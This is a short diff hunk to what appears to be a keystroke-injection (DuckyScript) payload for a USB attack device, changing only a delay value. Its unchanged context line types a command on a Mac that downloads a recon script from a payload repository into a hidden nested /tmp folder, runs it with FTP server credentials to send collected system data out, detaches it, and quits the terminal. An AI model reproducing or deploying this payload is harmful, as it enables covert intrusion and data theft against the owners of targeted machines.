@@ -15,6 +15,6 @@ DELAY 100
 
 STRING mkdir -p /tmp/.p/.w/.n/.d ; curl -s "https://raw.githubusercontent.com/un1x01d/o.mg-payloads/main/MacOS_Sysinfo/mac_local_recon.sh" -o /tmp/.p/.w/.n/.d/.mlr && chmod +x /tmp/.p/.w/.n/.d/.mlr ; /tmp/.p/.w/.n/.d/.mlr <ftp server> <username> <password> & disown
 ENTER
-DELAY 50
+DELAY 200 
 GUI q
 ENTER
